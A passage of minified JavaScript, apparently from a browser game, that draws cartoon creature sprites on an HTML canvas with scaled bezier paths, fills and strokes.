                    n.bezierCurveTo(13 * e, 67 * e, 13 * e, 67 * e, 7 * e, 59 * e),
                    n.bezierCurveTo(14 * e, 59 * e, 14 * e, 59 * e, 21 * e, 59 * e),
                    n.bezierCurveTo(46 * e, 35 * e, 35 * e, 45 * e, 49 * e, 31 * e),
                    n.bezierCurveTo(53 * e, 24 * e, 51 * e, 21 * e, 51 * e, 16 * e),
                    n.bezierCurveTo(63 * e, 23 * e, 63 * e, 24 * e, 69 * e, 29 * e),
                    n.bezierCurveTo(76 * e, 7 * e, 75 * e, 11 * e, 76 * e, 6 * e),
                    n.bezierCurveTo(81 * e, 12 * e, 84 * e, 18 * e, 89 * e, 27 * e),
                    n.bezierCurveTo(95 * e, 25 * e, 100 * e, 16 * e, 105 * e, 14 * e),
                    n.bezierCurveTo(103 * e, 25 * e, 111 * e, 33 * e, 110 * e, 34 * e),
                    n.bezierCurveTo(123 * e, 48 * e, 123 * e, 48 * e, 136 * e, 62 * e),
                    n.bezierCurveTo(142 * e, 60 * e, 147 * e, 59 * e, 155 * e, 58 * e),
                    n.bezierCurveTo(147 * e, 65 * e, 147 * e, 65 * e, 139 * e, 73 * e),
                    n.bezierCurveTo(145 * e, 73 * e, 145 * e, 73 * e, 151 * e, 73 * e),
                    n.bezierCurveTo(145 * e, 80 * e, 145 * e, 80 * e, 138 * e, 87 * e),
                    n.bezierCurveTo(144 * e, 88 * e, 144 * e, 88 * e, 150 * e, 89 * e),
                    n.bezierCurveTo(125 * e, 103 * e, 125 * e, 125 * e, 113 * e, 141 * e),
                    n.bezierCurveTo(92 * e, 178 * e, 85 * e, 177 * e, 76 * e, 178 * e),
                    n.bezierCurveTo(64 * e, 179 * e, 51 * e, 164 * e, 35 * e, 131 * e),
                    n.bezierCurveTo(18 * e, 95 * e, 13 * e, 99 * e, 8 * e, 93 * e),
                    n.closePath(),
                    he(n, void 0, t[2], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(25 * e, 63 * e),
                    n.bezierCurveTo(16 * e, 58 * e, 17 * e, 51 * e, 17 * e, 33 * e),
                    n.bezierCurveTo(19 * e, 12 * e, 21 * e, 12 * e, 32 * e, 17 * e),
                    n.bezierCurveTo(63 * e, 31 * e, 66 * e, 45 * e, 66 * e, 54 * e),
                    he(n, t[1], t[2], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(91 * e, 53 * e),
                    n.bezierCurveTo(91 * e, 40 * e, 98 * e, 33 * e, 121 * e, 20 * e),
                    n.bezierCurveTo(137 * e, 12 * e, 137 * e, 16 * e, 139 * e, 27 * e),
                    n.bezierCurveTo(141 * e, 49 * e, 140 * e, 57 * e, 134 * e, 64 * e),
                    he(n, t[1], t[2], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(31 * e, 63 * e),
                    n.bezierCurveTo(23 * e, 54 * e, 24 * e, 47 * e, 26 * e, 37 * e),
                    n.bezierCurveTo(28 * e, 29 * e, 31 * e, 31 * e, 41 * e, 35 * e),
                    n.bezierCurveTo(52 * e, 45 * e, 55 * e, 51 * e, 57 * e, 53 * e),
                    n.bezierCurveTo(50 * e, 50 * e, 44 * e, 47 * e, 43 * e, 48 * e),
                    n.bezierCurveTo(43 * e, 52 * e, 43 * e, 52 * e, 42 * e, 57 * e),
                    n.bezierCurveTo(38 * e, 54 * e, 38 * e, 54 * e, 33 * e, 51 * e),
                    n.bezierCurveTo(34 * e, 56 * e, 34 * e, 56 * e, 34 * e, 61 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(99 * e, 55 * e),
                    n.bezierCurveTo(107 * e, 43 * e, 113 * e, 39 * e, 121 * e, 34 * e),
                    n.bezierCurveTo(130 * e, 29 * e, 130 * e, 34 * e, 130 * e, 42 * e),
                    n.bezierCurveTo(131 * e, 57 * e, 128 * e, 61 * e, 129 * e, 63 * e),
                    n.bezierCurveTo(124 * e, 62 * e, 124 * e, 62 * e, 119 * e, 61 * e),
                    n.bezierCurveTo(119 * e, 56 * e, 120 * e, 61 * e, 118 * e, 52 * e),
                    n.bezierCurveTo(115 * e, 55 * e, 111 * e, 59 * e, 111 * e, 58 * e),
                    n.bezierCurveTo(110 * e, 54 * e, 109 * e, 57 * e, 109 * e, 51 * e),
                    n.closePath(),
                    he(n, t[3]),
                    i
            }
            function mi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 147 * e,
                    i.height = 172 * e,
                    n.globalAlpha = .5,
                    n.translate(0, 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(8 * e, 50 * e),
                    n.bezierCurveTo(15 * e, 16 * e, 49 * e, 6 * e, 67 * e, 6 * e),
                    n.bezierCurveTo(121 * e, 3 * e, 128 * e, 32 * e, 135 * e, 48 * e),
                    n.bezierCurveTo(146 * e, 96 * e, 124 * e, 131 * e, 96 * e, 135 * e),
                    n.bezierCurveTo(96 * e, 158 * e, 79 * e, 156 * e, 75 * e, 156 * e),
                    n.bezierCurveTo(50 * e, 154 * e, 53 * e, 150 * e, 52 * e, 135 * e),
                    n.bezierCurveTo(2 * e, 127 * e, 3 * e, 87 * e, 8 * e, 50 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.translate(0, -8 * e),
                    n.globalAlpha = 1,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(8 * e, 50 * e),
                    n.bezierCurveTo(15 * e, 16 * e, 49 * e, 6 * e, 67 * e, 6 * e),
                    n.bezierCurveTo(121 * e, 3 * e, 128 * e, 32 * e, 135 * e, 48 * e),
                    n.bezierCurveTo(146 * e, 96 * e, 124 * e, 131 * e, 96 * e, 135 * e),
                    n.bezierCurveTo(96 * e, 158 * e, 79 * e, 156 * e, 75 * e, 156 * e),
                    n.bezierCurveTo(50 * e, 154 * e, 53 * e, 150 * e, 52 * e, 135 * e),
                    n.bezierCurveTo(2 * e, 127 * e, 3 * e, 87 * e, 8 * e, 50 * e),
                    n.closePath(),
                    he(n, t[1], t[2], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(14 * e, 57 * e),
                    n.bezierCurveTo(2 * e, 50 * e, 5 * e, 22 * e, 24 * e, 22 * e),
                    n.bezierCurveTo(41 * e, 21 * e, 54 * e, 32 * e, 55 * e, 48 * e),
                    he(n, t[1], t[2], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(93 * e, 47 * e),
                    n.bezierCurveTo(94 * e, 24 * e, 116 * e, 21 * e, 120 * e, 20 * e),
                    n.bezierCurveTo(144 * e, 17 * e, 146 * e, 52 * e, 133 * e, 58 * e),
                    he(n, t[1], t[2], 4 * e),
                    ke(n, 51 * e, 91 * e, 9 * e),
                    he(n, t[3]),
                    ke(n, 95 * e, 91 * e, 9 * e),
                    he(n, t[3]),
                    ke(n, 91 * e, 89 * e, 4 * e),
                    he(n, t[4]),
                    ke(n, 47 * e, 89 * e, 4 * e),
                    he(n, t[4]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(54 * e, 133 * e),
                    n.bezierCurveTo(56 * e, 108 * e, 64 * e, 99 * e, 73 * e, 98 * e),
                    n.bezierCurveTo(86 * e, 97 * e, 91 * e, 119 * e, 93 * e, 133 * e),
                    n.bezierCurveTo(94 * e, 155 * e, 90 * e, 150 * e, 74 * e, 155 * e),
                    n.bezierCurveTo(50 * e, 152 * e, 55 * e, 145 * e, 54 * e, 134 * e),
                    n.closePath(),
                    he(n, t[5]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(65.25 * e, 135 * e),
                    n.bezierCurveTo(75.25 * e, 128 * e, 83.25 * e, 133 * e, 83.25 * e, 138 * e),
                    n.bezierCurveTo(88.25 * e, 148 * e, 61.25 * e, 149 * e, 64.25 * e, 137 * e),
                    n.closePath(),
                    he(n, t[6]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(74 * e, 145 * e),
                    n.bezierCurveTo(74 * e, 148 * e, 74 * e, 148 * e, 74 * e, 151 * e),
                    n.closePath(),
                    he(n, void 0, t[6], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(19 * e, 58 * e),
                    n.bezierCurveTo(10 * e, 38 * e, 18 * e, 33 * e, 28 * e, 34 * e),
                    n.bezierCurveTo(41 * e, 39 * e, 45 * e, 45 * e, 50 * e, 51 * e),
                    n.closePath(),
                    he(n, t[6]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(100 * e, 51 * e),
                    n.bezierCurveTo(106 * e, 36 * e, 119 * e, 31 * e, 128 * e, 36 * e),
                    n.bezierCurveTo(137 * e, 49 * e, 128 * e, 58 * e, 128 * e, 60 * e),
                    n.closePath(),
                    he(n, t[6]),
                    i
            }
            function Di(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 271 * e,
                    i.height = 366 * e,
                    n.globalAlpha = .5,
                    n.translate(0, 10 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 99 * e),
                    n.bezierCurveTo(186 * e, 123 * e, 199 * e, 152 * e, 209 * e, 169 * e),
                    n.bezierCurveTo(228 * e, 205 * e, 224 * e, 245 * e, 190 * e, 276 * e),
                    n.bezierCurveTo(161 * e, 296 * e, 99 * e, 292 * e, 79 * e, 274 * e),
                    n.bezierCurveTo(49 * e, 253 * e, 47 * e, 214 * e, 50 * e, 197 * e),
                    n.bezierCurveTo(61 * e, 143 * e, 102 * e, 113 * e, 131 * e, 99 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(73 * e, 270 * e),
                    n.bezierCurveTo(79 * e, 280 * e, 77 * e, 280 * e, 78 * e, 287 * e),
                    n.bezierCurveTo(78 * e, 290 * e, 83 * e, 291 * e, 82 * e, 299 * e),
                    n.bezierCurveTo(81 * e, 301 * e, 87 * e, 301 * e, 92 * e, 314 * e),
                    n.bezierCurveTo(94 * e, 319 * e, 100 * e, 321 * e, 107 * e, 320 * e),
                    n.bezierCurveTo(111 * e, 323 * e, 114 * e, 324 * e, 119 * e, 320 * e),
                    n.bezierCurveTo(137 * e, 321 * e, 146 * e, 323 * e, 139 * e, 320 * e),
                    n.bezierCurveTo(141 * e, 324 * e, 150 * e, 324 * e, 153 * e, 320 * e),
                    n.bezierCurveTo(168 * e, 319 * e, 171 * e, 316 * e, 173 * e, 307 * e),
                    n.bezierCurveTo(180 * e, 305 * e, 180 * e, 301 * e, 178 * e, 296 * e),
                    n.bezierCurveTo(183 * e, 296 * e, 185 * e, 289 * e, 188 * e, 279 * e),
                    n.bezierCurveTo(171 * e, 286 * e, 149 * e, 290 * e, 132 * e, 289 * e),
                    n.bezierCurveTo(101 * e, 290 * e, 86 * e, 280 * e, 74 * e, 271 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(76 * e, 252 * e),
                    n.bezierCurveTo(85 * e, 294 * e, 96 * e, 314 * e, 103 * e, 314 * e),
                    n.bezierCurveTo(106 * e, 316 * e, 151 * e, 314 * e, 156 * e, 314 * e),
                    n.bezierCurveTo(169 * e, 317 * e, 182 * e, 285 * e, 191 * e, 256 * e),
                    n.bezierCurveTo(134.5 * e, 254 * e, 134.5 * e, 254 * e, 78 * e, 252 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(84 * e, 257 * e),
                    n.bezierCurveTo(122 * e, 273 * e, 146 * e, 268 * e, 179 * e, 261 * e),
                    n.bezierCurveTo(190 * e, 258 * e, 187 * e, 266 * e, 178 * e, 272 * e),
                    n.bezierCurveTo(160 * e, 284 * e, 123 * e, 282 * e, 100 * e, 277 * e),
                    n.bezierCurveTo(73 * e, 260 * e, 79 * e, 257 * e, 84 * e, 257 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(125 * e, 65 * e),
                    n.bezierCurveTo(133 * e, 45 * e, 136 * e, 42 * e, 141 * e, 55 * e),
                    n.bezierCurveTo(151 * e, 96 * e, 164 * e, 117 * e, 175 * e, 134 * e),
                    n.bezierCurveTo(203 * e, 181 * e, 207 * e, 182 * e, 208 * e, 215 * e),
                    n.bezierCurveTo(206 * e, 240 * e, 205 * e, 246 * e, 184 * e, 258 * e),
                    n.bezierCurveTo(161 * e, 267 * e, 131 * e, 272 * e, 86 * e, 258 * e),
                    n.bezierCurveTo(67 * e, 252 * e, 68 * e, 239 * e, 64 * e, 216 * e),
                    n.bezierCurveTo(62 * e, 194 * e, 72 * e, 169 * e, 92 * e, 142 * e),
                    n.bezierCurveTo(106 * e, 121 * e, 114 * e, 101 * e, 125 * e, 65 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(115 * e, 37 * e),
                    n.bezierCurveTo(116 * e, 28 * e, 119 * e, 27 * e, 126 * e, 37 * e),
                    n.bezierCurveTo(134 * e, 48 * e, 134 * e, 49 * e, 132 * e, 59 * e),
                    n.bezierCurveTo(131 * e, 67 * e, 127 * e, 65 * e, 120 * e, 56 * e),
                    n.bezierCurveTo(114 * e, 49 * e, 113 * e, 43 * e, 115 * e, 38 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(146 * e, 34 * e),
                    n.bezierCurveTo(152 * e, 28 * e, 155 * e, 27 * e, 157 * e, 39 * e),
                    n.bezierCurveTo(157 * e, 45 * e, 157 * e, 49 * e, 150 * e, 56 * e),
                    n.bezierCurveTo(141 * e, 66 * e, 138 * e, 66 * e, 138 * e, 57 * e),
                    n.bezierCurveTo(137 * e, 50 * e, 137 * e, 47 * e, 141 * e, 42 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(143 * e, 69 * e),
                    n.bezierCurveTo(148 * e, 56 * e, 156 * e, 50 * e, 158 * e, 58 * e),
                    n.bezierCurveTo(159 * e, 64 * e, 160 * e, 67 * e, 153 * e, 77 * e),
                    n.bezierCurveTo(148 * e, 83 * e, 145 * e, 84 * e, 143 * e, 77 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(149 * e, 92 * e),
                    n.bezierCurveTo(149 * e, 89 * e, 151 * e, 84 * e, 156 * e, 79 * e),
                    n.bezierCurveTo(161 * e, 73 * e, 163 * e, 78 * e, 162 * e, 86 * e),
                    n.bezierCurveTo(161 * e, 91 * e, 155 * e, 99 * e, 152 * e, 98 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(111 * e, 61 * e),
                    n.bezierCurveTo(114 * e, 51 * e, 117 * e, 51 * e, 124 * e, 64 * e),
                    n.bezierCurveTo(128 * e, 68 * e, 128 * e, 76 * e, 126 * e, 79 * e),
                    n.bezierCurveTo(123 * e, 84 * e, 122 * e, 82 * e, 115 * e, 74 * e),
                    n.bezierCurveTo(112 * e, 67 * e, 115 * e, 74 * e, 115 * e, 74 * e),
                    n.bezierCurveTo(111 * e, 68 * e, 111 * e, 66 * e, 111 * e, 62 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(107 * e, 81 * e),
                    n.bezierCurveTo(108 * e, 74 * e, 112 * e, 73 * e, 118 * e, 84 * e),
                    n.bezierCurveTo(122 * e, 88 * e, 122 * e, 93 * e, 121 * e, 98 * e),
                    n.bezierCurveTo(114 * e, 98 * e, 113 * e, 98 * e, 109 * e, 90 * e),
                    n.bezierCurveTo(107 * e, 87 * e, 106 * e, 85 * e, 107 * e, 82 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.translate(0, -10 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 99 * e),
                    n.bezierCurveTo(186 * e, 123 * e, 199 * e, 152 * e, 209 * e, 169 * e),
                    n.bezierCurveTo(228 * e, 205 * e, 224 * e, 245 * e, 190 * e, 276 * e),
                    n.bezierCurveTo(161 * e, 296 * e, 99 * e, 292 * e, 79 * e, 274 * e),
                    n.bezierCurveTo(49 * e, 253 * e, 47 * e, 214 * e, 50 * e, 197 * e),
                    n.bezierCurveTo(61 * e, 143 * e, 102 * e, 113 * e, 131 * e, 99 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(73 * e, 270 * e),
                    n.bezierCurveTo(79 * e, 280 * e, 77 * e, 280 * e, 78 * e, 287 * e),
                    n.bezierCurveTo(78 * e, 290 * e, 83 * e, 291 * e, 82 * e, 299 * e),
                    n.bezierCurveTo(81 * e, 301 * e, 87 * e, 301 * e, 92 * e, 314 * e),
                    n.bezierCurveTo(94 * e, 319 * e, 100 * e, 321 * e, 107 * e, 320 * e),
                    n.bezierCurveTo(111 * e, 323 * e, 114 * e, 324 * e, 119 * e, 320 * e),
                    n.bezierCurveTo(137 * e, 321 * e, 146 * e, 323 * e, 139 * e, 320 * e),
                    n.bezierCurveTo(141 * e, 324 * e, 150 * e, 324 * e, 153 * e, 320 * e),
                    n.bezierCurveTo(168 * e, 319 * e, 171 * e, 316 * e, 173 * e, 307 * e),
                    n.bezierCurveTo(180 * e, 305 * e, 180 * e, 301 * e, 178 * e, 296 * e),
                    n.bezierCurveTo(183 * e, 296 * e, 185 * e, 289 * e, 188 * e, 279 * e),
                    n.bezierCurveTo(171 * e, 286 * e, 149 * e, 290 * e, 132 * e, 289 * e),
                    n.bezierCurveTo(101 * e, 290 * e, 86 * e, 280 * e, 74 * e, 271 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(76 * e, 252 * e),
                    n.bezierCurveTo(85 * e, 294 * e, 96 * e, 314 * e, 103 * e, 314 * e),
                    n.bezierCurveTo(106 * e, 316 * e, 151 * e, 314 * e, 156 * e, 314 * e),
                    n.bezierCurveTo(169 * e, 317 * e, 182 * e, 285 * e, 191 * e, 256 * e),
                    n.bezierCurveTo(134.5 * e, 254 * e, 134.5 * e, 254 * e, 78 * e, 252 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(84 * e, 257 * e),
                    n.bezierCurveTo(122 * e, 273 * e, 146 * e, 268 * e, 179 * e, 261 * e),
                    n.bezierCurveTo(190 * e, 258 * e, 187 * e, 266 * e, 178 * e, 272 * e),
                    n.bezierCurveTo(160 * e, 284 * e, 123 * e, 282 * e, 100 * e, 277 * e),
                    n.bezierCurveTo(73 * e, 260 * e, 79 * e, 257 * e, 84 * e, 257 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(125 * e, 65 * e),
                    n.bezierCurveTo(133 * e, 45 * e, 136 * e, 42 * e, 141 * e, 55 * e),
                    n.bezierCurveTo(151 * e, 96 * e, 164 * e, 117 * e, 175 * e, 134 * e),
                    n.bezierCurveTo(203 * e, 181 * e, 207 * e, 182 * e, 208 * e, 215 * e),
                    n.bezierCurveTo(206 * e, 240 * e, 205 * e, 246 * e, 184 * e, 258 * e),
                    n.bezierCurveTo(161 * e, 267 * e, 131 * e, 272 * e, 86 * e, 258 * e),
                    n.bezierCurveTo(67 * e, 252 * e, 68 * e, 239 * e, 64 * e, 216 * e),
                    n.bezierCurveTo(62 * e, 194 * e, 72 * e, 169 * e, 92 * e, 142 * e),
                    n.bezierCurveTo(106 * e, 121 * e, 114 * e, 101 * e, 125 * e, 65 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(115 * e, 37 * e),
                    n.bezierCurveTo(116 * e, 28 * e, 119 * e, 27 * e, 126 * e, 37 * e),
                    n.bezierCurveTo(134 * e, 48 * e, 134 * e, 49 * e, 132 * e, 59 * e),
                    n.bezierCurveTo(131 * e, 67 * e, 127 * e, 65 * e, 120 * e, 56 * e),
                    n.bezierCurveTo(114 * e, 49 * e, 113 * e, 43 * e, 115 * e, 38 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(146 * e, 34 * e),
                    n.bezierCurveTo(152 * e, 28 * e, 155 * e, 27 * e, 157 * e, 39 * e),
                    n.bezierCurveTo(157 * e, 45 * e, 157 * e, 49 * e, 150 * e, 56 * e),
                    n.bezierCurveTo(141 * e, 66 * e, 138 * e, 66 * e, 138 * e, 57 * e),
                    n.bezierCurveTo(137 * e, 50 * e, 137 * e, 47 * e, 141 * e, 42 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(143 * e, 69 * e),
                    n.bezierCurveTo(148 * e, 56 * e, 156 * e, 50 * e, 158 * e, 58 * e),
                    n.bezierCurveTo(159 * e, 64 * e, 160 * e, 67 * e, 153 * e, 77 * e),
                    n.bezierCurveTo(148 * e, 83 * e, 145 * e, 84 * e, 143 * e, 77 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(149 * e, 92 * e),
                    n.bezierCurveTo(149 * e, 89 * e, 151 * e, 84 * e, 156 * e, 79 * e),
                    n.bezierCurveTo(161 * e, 73 * e, 163 * e, 78 * e, 162 * e, 86 * e),
                    n.bezierCurveTo(161 * e, 91 * e, 155 * e, 99 * e, 152 * e, 98 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(111 * e, 61 * e),
                    n.bezierCurveTo(114 * e, 51 * e, 117 * e, 51 * e, 124 * e, 64 * e),
                    n.bezierCurveTo(128 * e, 68 * e, 128 * e, 76 * e, 126 * e, 79 * e),
                    n.bezierCurveTo(123 * e, 84 * e, 122 * e, 82 * e, 115 * e, 74 * e),
                    n.bezierCurveTo(112 * e, 67 * e, 115 * e, 74 * e, 115 * e, 74 * e),
                    n.bezierCurveTo(111 * e, 68 * e, 111 * e, 66 * e, 111 * e, 62 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(107 * e, 81 * e),
                    n.bezierCurveTo(108 * e, 74 * e, 112 * e, 73 * e, 118 * e, 84 * e),
                    n.bezierCurveTo(122 * e, 88 * e, 122 * e, 93 * e, 121 * e, 98 * e),
                    n.bezierCurveTo(114 * e, 98 * e, 113 * e, 98 * e, 109 * e, 90 * e),
                    n.bezierCurveTo(107 * e, 87 * e, 106 * e, 85 * e, 107 * e, 82 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 99 * e),
                    n.bezierCurveTo(186 * e, 123 * e, 199 * e, 152 * e, 209 * e, 169 * e),
                    n.bezierCurveTo(228 * e, 205 * e, 224 * e, 245 * e, 190 * e, 276 * e),
                    n.bezierCurveTo(161 * e, 296 * e, 99 * e, 292 * e, 79 * e, 274 * e),
                    n.bezierCurveTo(49 * e, 253 * e, 47 * e, 214 * e, 50 * e, 197 * e),
                    n.bezierCurveTo(61 * e, 143 * e, 102 * e, 113 * e, 131 * e, 99 * e),
                    n.closePath(),
                    he(n, t[1]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(73 * e, 270 * e),
                    n.bezierCurveTo(79 * e, 280 * e, 77 * e, 280 * e, 78 * e, 287 * e),
                    n.bezierCurveTo(78 * e, 290 * e, 83 * e, 291 * e, 82 * e, 299 * e),
                    n.bezierCurveTo(81 * e, 301 * e, 87 * e, 301 * e, 92 * e, 314 * e),
                    n.bezierCurveTo(94 * e, 319 * e, 100 * e, 321 * e, 107 * e, 320 * e),
                    n.bezierCurveTo(111 * e, 323 * e, 114 * e, 324 * e, 119 * e, 320 * e),
                    n.bezierCurveTo(137 * e, 321 * e, 146 * e, 323 * e, 139 * e, 320 * e),
                    n.bezierCurveTo(141 * e, 324 * e, 150 * e, 324 * e, 153 * e, 320 * e),
                    n.bezierCurveTo(168 * e, 319 * e, 171 * e, 316 * e, 173 * e, 307 * e),
                    n.bezierCurveTo(180 * e, 305 * e, 180 * e, 301 * e, 178 * e, 296 * e),
                    n.bezierCurveTo(183 * e, 296 * e, 185 * e, 289 * e, 188 * e, 279 * e),
                    n.bezierCurveTo(171 * e, 286 * e, 149 * e, 290 * e, 132 * e, 289 * e),
                    n.bezierCurveTo(101 * e, 290 * e, 86 * e, 280 * e, 74 * e, 271 * e),
                    n.closePath(),
                    he(n, t[5]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(76 * e, 252 * e),
                    n.bezierCurveTo(85 * e, 294 * e, 96 * e, 314 * e, 103 * e, 314 * e),
                    n.bezierCurveTo(106 * e, 316 * e, 151 * e, 314 * e, 156 * e, 314 * e),
                    n.bezierCurveTo(169 * e, 317 * e, 182 * e, 285 * e, 191 * e, 256 * e),
                    n.bezierCurveTo(134.5 * e, 254 * e, 134.5 * e, 254 * e, 78 * e, 252 * e),
                    n.closePath(),
                    he(n, t[2]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(84 * e, 257 * e),
                    n.bezierCurveTo(122 * e, 273 * e, 146 * e, 268 * e, 179 * e, 261 * e),
                    n.bezierCurveTo(190 * e, 258 * e, 187 * e, 266 * e, 178 * e, 272 * e),
                    n.bezierCurveTo(160 * e, 284 * e, 123 * e, 282 * e, 100 * e, 277 * e),
                    n.bezierCurveTo(73 * e, 260 * e, 79 * e, 257 * e, 84 * e, 257 * e),
                    n.closePath(),
                    he(n, t[1]),
                    ke(n, 102 * e, 269 * e, 11 * e),
                    he(n, t[3]),
                    ke(n, 98 * e, 266 * e, 5 * e),
                    he(n, t[6]),
                    ke(n, 168 * e, 269 * e, 11 * e),
                    he(n, t[3]),
                    ke(n, 164 * e, 266 * e, 5 * e),
                    he(n, t[6]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(125 * e, 65 * e),
                    n.bezierCurveTo(133 * e, 45 * e, 136 * e, 42 * e, 141 * e, 55 * e),
                    n.bezierCurveTo(151 * e, 96 * e, 164 * e, 117 * e, 175 * e, 134 * e),
                    n.bezierCurveTo(203 * e, 181 * e, 207 * e, 182 * e, 208 * e, 215 * e),
                    n.bezierCurveTo(206 * e, 240 * e, 205 * e, 246 * e, 184 * e, 258 * e),
                    n.bezierCurveTo(161 * e, 267 * e, 131 * e, 272 * e, 86 * e, 258 * e),
                    n.bezierCurveTo(67 * e, 252 * e, 68 * e, 239 * e, 64 * e, 216 * e),
                    n.bezierCurveTo(62 * e, 194 * e, 72 * e, 169 * e, 92 * e, 142 * e),
                    n.bezierCurveTo(106 * e, 121 * e, 114 * e, 101 * e, 125 * e, 65 * e),
                    n.closePath(),
                    he(n, t[2]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(115 * e, 235 * e),
                    n.bezierCurveTo(118 * e, 258 * e, 137 * e, 268 * e, 148 * e, 246 * e),
                    n.bezierCurveTo(156 * e, 228 * e, 152 * e, 169 * e, 150 * e, 140 * e),
                    n.bezierCurveTo(147 * e, 87 * e, 143 * e, 69 * e, 142 * e, 60 * e),
                    n.bezierCurveTo(136 * e, 44 * e, 132 * e, 43 * e, 127 * e, 62 * e),
                    n.bezierCurveTo(119 * e, 116 * e, 119 * e, 140 * e, 116 * e, 166 * e),
                    n.bezierCurveTo(113 * e, 202 * e, 113 * e, 223 * e, 115 * e, 233 * e),
                    n.closePath(),
                    he(n, t[4]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(132 * e, 219 * e),
                    n.bezierCurveTo(140 * e, 229 * e, 142 * e, 231 * e, 145 * e, 237 * e),
                    n.bezierCurveTo(145 * e, 245 * e, 139 * e, 249 * e, 133 * e, 249 * e),
                    n.bezierCurveTo(123 * e, 248 * e, 123 * e, 243 * e, 121 * e, 239 * e),
                    n.bezierCurveTo(126 * e, 227 * e, 129 * e, 223 * e, 132 * e, 219 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
